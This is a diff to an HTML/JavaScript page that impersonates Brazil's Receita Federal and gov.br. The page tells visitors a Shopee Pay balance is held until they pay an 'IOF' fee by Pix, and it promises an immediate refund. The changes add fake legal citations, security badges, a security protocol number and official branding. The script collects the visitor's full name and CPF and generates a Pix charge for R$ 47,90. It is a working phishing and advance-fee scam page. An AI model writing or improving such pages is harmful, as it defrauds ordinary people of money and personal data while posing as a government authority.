@@ -3,86 +3,254 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Regularização IOF</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <title>Pagamento de Tributos - Gov.br</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --receita-blue: #0038a9; --green: #28a745; --bg-gray: #f8f9fa; --border: #e9ecef; --text-dark: #212529; }
-        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body { font-family: 'Inter', sans-serif; background-color: #fff; margin: 0; padding: 0; min-height: 100vh; display: flex; flex-direction: column; }
-        
-        /* HEADER AZUL OFICIAL RECEITA */
-        .app-header { 
-            width: 100%; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center;
-            background-color: var(--receita-blue); 
-            box-shadow: 0 4px 15px rgba(0,56,169,0.3); 
-            position: sticky; top: 0; z-index: 100; 
-            padding: 15px 0;
-        }
-        
-        .banner-img { 
-            height: 40px; 
-            display: block; 
-            filter: brightness(0) invert(1); /* Deixa o logo branco */
+        :root {
+            --gov-blue: #0038a9;   /* Azul Receita */
+            --gov-dark: #00236b;   /* Azul Escuro */
+            --success: #138a41;    /* Verde Gov */
+            --bg-gray: #f8f9fa;
+            --text-main: #333;
+            --border-color: #e0e0e0;
         }
 
-        .content { flex: 1; padding: 20px; display: flex; flex-direction: column; }
-        .title-hero { margin-bottom: 20px; text-align: center; }
-        .title-hero h1 { margin: 0 0 5px; font-size: 20px; color: var(--text-dark); letter-spacing: -0.5px; font-weight: 800; }
-        .title-hero p { margin: 0; font-size: 14px; color: #6c757d; }
+        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
         
-        .summary-card { background: var(--bg-gray); border-radius: 12px; padding: 20px; margin-bottom: 20px; border: 1px solid var(--border); }
-        .row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; color: #495057; }
-        .total-row { margin-top: 15px; padding-top: 15px; border-top: 1px dashed #ced4da; display: flex; justify-content: space-between; align-items: center; }
-        .total-value { font-size: 20px; font-weight: 800; color: var(--green); }
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-gray);
+            margin: 0; padding: 0;
+            color: var(--text-main);
+            min-height: 100vh;
+            display: flex; flex-direction: column;
+        }
+
+        /* --- HEADER OFICIAL --- */
+        .gov-header {
+            background-color: var(--gov-blue);
+            width: 100%;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            position: sticky; top: 0; z-index: 100;
+        }
         
-        .refund-notice { background: #e3f2fd; border: 1px solid #90caf9; padding: 15px; border-radius: 8px; margin-bottom: 20px; font-size: 13px; color: #0d47a1; line-height: 1.4; }
+        /* Cadeado SVG Perfeito */
+        .lock-icon { width: 20px; height: 20px; fill: white; margin-right: 10px; }
         
-        .input { width: 100%; padding: 16px; border: 1px solid #ced4da; border-radius: 8px; font-size: 16px; margin-bottom: 15px; }
-        .btn-main { width: 100%; padding: 18px; background: var(--green); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 700; text-transform: uppercase; cursor: pointer; margin-top: 10px; }
-        
-        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 30px; }
-        .qr-img { width: 200px; margin: 20px 0; border: 1px solid #eee; border-radius: 8px; }
-        .pix-code-box { background: #f8f9fa; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 20px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; resize: none; height: 80px; }
+        .header-title {
+            color: white;
+            font-weight: 700;
+            font-size: 16px;
+            letter-spacing: 0.5px;
+            text-transform: uppercase;
+        }
+
+        /* --- CONTEÚDO PRINCIPAL --- */
+        .container {
+            flex: 1;
+            padding: 20px;
+            max-width: 600px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Título Hero */
+        .page-title { text-align: center; margin-bottom: 25px; }
+        .page-title h1 { font-size: 20px; color: var(--gov-dark); margin: 0 0 5px 0; font-weight: 700; }
+        .page-title p { font-size: 13px; color: #666; margin: 0; }
+
+        /* Card de Resumo */
+        .card-summary {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            border: 1px solid var(--border-color);
+            margin-bottom: 20px;
+        }
+
+        .row-detail { display: flex; justify-content: space-between; margin-bottom: 12px; font-size: 14px; color: #555; }
+        .row-detail.total {
+            margin-top: 15px; padding-top: 15px;
+            border-top: 1px dashed var(--border-color);
+            align-items: center;
+        }
+        .text-taxa { color: #d32f2f; font-weight: 600; }
+        .text-total-label { font-weight: 700; color: var(--gov-dark); }
+        .text-total-value { font-size: 22px; font-weight: 800; color: var(--success); }
+
+        /* Aviso Reembolso */
+        .notice-box {
+            background: #e3f2fd;
+            border-left: 4px solid #1976d2;
+            padding: 12px 15px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #0d47a1;
+            line-height: 1.4;
+        }
+
+        /* Inputs */
+        .input-group { margin-bottom: 15px; }
+        .input-field {
+            width: 100%; padding: 16px;
+            border: 1px solid #ccc; border-radius: 6px;
+            font-size: 16px; transition: 0.3s;
+        }
+        .input-field:focus { border-color: var(--gov-blue); box-shadow: 0 0 0 2px rgba(0,56,169,0.1); }
+
+        /* Botão */
+        .btn-pay {
+            width: 100%; padding: 18px;
+            background: var(--success);
+            color: white; border: none; border-radius: 6px;
+            font-size: 16px; font-weight: 700;
+            cursor: pointer; text-transform: uppercase;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+            display: flex; align-items: center; justify-content: center; gap: 10px;
+        }
+        .btn-pay:hover { filter: brightness(0.95); }
+
+        /* --- ÁREA DE CONFIANÇA (Rodapé Robusto) --- */
+        .trust-section {
+            margin-top: 30px;
+            border-top: 1px solid #e0e0e0;
+            padding-top: 20px;
+        }
+
+        .trust-header {
+            display: flex; align-items: center; gap: 10px;
+            margin-bottom: 15px;
+        }
+        .shield-icon { width: 18px; height: 18px; fill: #666; }
+        .trust-title { font-size: 12px; font-weight: 700; color: #555; text-transform: uppercase; }
+
+        .trust-info {
+            font-size: 11px; color: #777; line-height: 1.6; text-align: justify;
+            margin-bottom: 15px;
+        }
+
+        .security-badges {
+            display: flex; gap: 15px; margin-bottom: 20px;
+        }
+        .badge {
+            background: #fff; border: 1px solid #ddd;
+            border-radius: 4px; padding: 5px 10px;
+            font-size: 10px; font-weight: 600; color: #555;
+            display: flex; align-items: center; gap: 5px;
+        }
+        .badge::before { content: '🔒'; }
+
+        .official-footer {
+            text-align: center; margin-top: 30px; opacity: 0.7;
+        }
+        .gov-logo { height: 25px; }
+
+        /* --- MODAL QR CODE --- */
+        #qr-screen { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 500; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+        .qr-card { background: white; width: 100%; max-width: 350px; text-align: center; }
+        .qr-img { width: 180px; margin: 15px auto; border: 1px solid #eee; border-radius: 8px; }
+        .pix-code-box { background: #f5f5f5; padding: 12px; width: 100%; font-size: 11px; text-align: center; margin-bottom: 15px; border: 1px dashed #ccc; border-radius: 6px; color: #555; word-break: break-all; }
+
     </style>
 </head>
 <body>
-    <div class="app-header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" 
-             class="banner-img" 
-             alt="Receita Federal"
-             referrerpolicy="no-referrer">
+
+    <div class="gov-header">
+        <svg class="lock-icon" viewBox="0 0 24 24">
+            <path d="M12 17a2 2 0 1 0 0-4 2 2 0 0 0 0 4zm6-9h-1V6a5 5 0 0 0-10 0v2H6a2 2 0 0 0-2 2v10a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2zM9 6a3 3 0 1 1 6 0v2H9V6z"/>
+        </svg>
+        <span class="header-title">Receita Federal</span>
     </div>
 
-    <div class="content">
-        <div class="title-hero">
-            <h1>Liberação de Valores</h1>
-            <p>Regularize a taxa de IOF para receber.</p>
-        </div>
-        <div class="summary-card">
-            <div class="row"><span>Saldo Retido</span><strong>R$ 1.489,38</strong></div>
-            <div class="row"><span>Taxa (IOF)</span><strong style="color: #dc3545;">R$ 47,90</strong></div>
-            <div class="total-row"><span style="font-weight:700;">Você paga agora:</span><span class="total-value">R$ 47,90</span></div>
-        </div>
-        <div class="refund-notice"><strong>Reembolso Automático:</strong> Os R$ 47,90 retornam em 10 segundos.</div>
+    <div class="container">
         
-        <input type="text" id="nome" class="input" placeholder="Nome Completo">
-        <input type="tel" id="cpf" class="input" placeholder="CPF" maxlength="14" oninput="mask(this)">
+        <div class="page-title">
+            <h1>Regularização de Tributos</h1>
+            <p>Guia de Recolhimento da União (GRU)</p>
+        </div>
+
+        <div class="card-summary">
+            <div class="row-detail"><span>Origem do Saldo</span><strong>Shopee Pay Instituição de Pagamento</strong></div>
+            <div class="row-detail"><span>Valor Retido</span><strong>R$ 1.489,38</strong></div>
+            <div class="row-detail"><span>Tributo (IOF)</span><strong class="text-taxa">R$ 47,90</strong></div>
+            
+            <div class="row-detail total">
+                <span class="text-total-label">Total a Pagar:</span>
+                <span class="text-total-value">R$ 47,90</span>
+            </div>
+        </div>
+
+        <div class="notice-box">
+            <strong>Reembolso Automático (Lei nº 14.596):</strong> O valor do tributo é estornado automaticamente para sua conta em até 2 minutos após a validação da identidade.
+        </div>
         
-        <button class="btn-main" onclick="gerarPixIOF()">PAGAR TAXA E LIBERAR</button>
-        <div style="text-align:center; margin-top:20px; color:#aaa; font-size:11px;">Banco Central do Brasil • Seguro SSL</div>
+        <div class="input-group">
+            <input type="text" id="nome" class="input-field" placeholder="Nome Completo do Contribuinte">
+        </div>
+        
+        <div class="input-group">
+            <input type="tel" id="cpf" class="input-field" placeholder="CPF" maxlength="14" oninput="mask(this)">
+        </div>
+        
+        <button class="btn-pay" onclick="gerarPixIOF()">
+            <svg style="width:20px;height:20px;fill:white" viewBox="0 0 24 24"><path d="M5 20h14v2H5v-2zm7-18l-1 1h-3v2H7v1H5v3h2v3h4v4h4v-4h4v-3h2V9h-2V8h-1V6h-3l-1-1z"/></svg>
+            Pagar Taxa e Liberar
+        </button>
+
+        <div class="trust-section">
+            <div class="trust-header">
+                <svg class="shield-icon" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+                <span class="trust-title">Ambiente Seguro e Autenticado</span>
+            </div>
+            
+            <p class="trust-info">
+                Esta transação é processada em ambiente criptografado de ponta a ponta (SSL 256-bit). A regularização do Imposto sobre Operações Financeiras (IOF) é obrigatória conforme Decreto nº 6.306/2007 para liberação de créditos provenientes de plataformas digitais.
+            </p>
+            
+            <div class="row-detail" style="font-size:11px; margin-bottom:5px;">
+                <span>Protocolo de Segurança:</span>
+                <strong>2026.8.038.991-RFB</strong>
+            </div>
+            
+            <div class="security-badges">
+                <div class="badge">Site Blindado</div>
+                <div class="badge">Google Safe Browsing</div>
+                <div class="badge">Banco Central</div>
+            </div>
+
+            <div class="official-footer">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="gov-logo" style="opacity:0.6">
+                <div style="font-size:10px; color:#999; margin-top:10px;">
+                    Ministério da Economia • Secretaria Especial da Receita Federal<br>
+                    Brasília - DF • CNPJ: 00.394.460/0001-41
+                </div>
+            </div>
+        </div>
+
     </div>
 
     <div id="qr-screen">
-        <h3>Pagamento Seguro</h3>
-        <p style="color:#666;font-size:14px; text-align:center;">Abra o app do seu banco e escolha "Pix Copia e Cola".</p>
-        <img id="qr-image" class="qr-img">
-        <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
-        <button class="btn-main" onclick="copiarCodigo()">COPIAR CÓDIGO PIX</button>
-        <div id="msg-sucesso" style="margin-top:20px;color:green;display:none;font-weight:bold;text-align:center;">PAGAMENTO APROVADO!</div>
+        <div class="qr-card">
+            <h3 style="color:var(--gov-dark); margin-bottom:5px;">Pagamento via Pix</h3>
+            <p style="font-size:13px; color:#666;">Copie o código abaixo e pague no seu banco.</p>
+            
+            <img id="qr-image" class="qr-img">
+            
+            <div style="font-size:11px; font-weight:bold; margin-bottom:5px; text-align:left;">Pix Copia e Cola:</div>
+            <textarea id="pix-copia" class="pix-code-box" readonly></textarea>
+            
+            <button class="btn-pay" onclick="copiarCodigo()">Copiar Código Pix</button>
+            
+            <div id="msg-sucesso" style="margin-top:15px;color:var(--success);display:none;font-weight:bold;text-align:center;">
+                PAGAMENTO CONFIRMADO!
+            </div>
+        </div>
     </div>
 
     <script>
@@ -90,23 +258,42 @@
         function mask(i){ let v=i.value.replace(/\D/g,""); v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,"$1.$2.$3-$4"); i.value=v; }
         
         async function gerarPixIOF() {
-            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-main');
+            const n=document.getElementById('nome').value, c=document.getElementById('cpf').value.replace(/\D/g,''), b=document.querySelector('.btn-pay');
             if(n.length<3||c.length<11) return alert("Preencha todos os dados.");
-            b.innerText="GERANDO PIX..."; b.disabled=true;
+            
+            b.innerHTML = "Processando..."; b.disabled=true; b.style.opacity = "0.7";
+            
             try {
-                const r=await fetch(`${API_URL}/pix`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:47.90,name:n,cpf:c})});
+                // VALOR DA TAXA (Configurável aqui se quiser mudar para 37.90 ou manter 47.90)
+                const r=await fetch(`${API_URL}/pix`,{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({amount:47.90,name:n,cpf:c})
+                });
                 const d=await r.json();
+                
                 if(d.point_of_interaction){
                     document.getElementById('qr-image').src=`data:image/png;base64,${d.point_of_interaction.transaction_data.qr_code_base64}`;
-                    const codigoLimpo = d.point_of_interaction.transaction_data.qr_code.trim();
-                    document.getElementById('pix-copia').value = codigoLimpo;
+                    document.getElementById('pix-copia').value = d.point_of_interaction.transaction_data.qr_code;
                     document.getElementById('qr-screen').style.display='flex';
                     monitor(d.id);
-                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
-            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerText="PAGAR TAXA E LIBERAR"; }
+                } else { alert("Erro ao gerar Pix."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
+            } catch(e){ alert("Erro de conexão."); b.disabled=false; b.innerHTML="Pagar Taxa e Liberar"; }
         }
-        function monitor(id){ const i=setInterval(async()=>{ try{ const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); if(j.status==='approved'||j.status==='refunded'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; document.getElementById('qr-image').style.opacity=0.3; } }catch(e){} },3000); }
-        function copiarCodigo(){ const t=document.getElementById('pix-copia'); t.select(); document.execCommand('copy'); alert("CÓDIGO COPIADO!"); }
+
+        function monitor(id){ 
+            const i=setInterval(async()=>{ 
+                try{ 
+                    const r=await fetch(`${API_URL}/pix/${id}`); const j=await r.json(); 
+                    if(j.status==='approved'){ clearInterval(i); document.getElementById('msg-sucesso').style.display='block'; } 
+                }catch(e){} 
+            },3000); 
+        }
+
+        function copiarCodigo(){ 
+            const t=document.getElementById('pix-copia'); t.select(); t.setSelectionRange(0,99999); 
+            document.execCommand('copy'); alert("Código copiado!"); 
+        }
     </script>
 </body>
 </html>
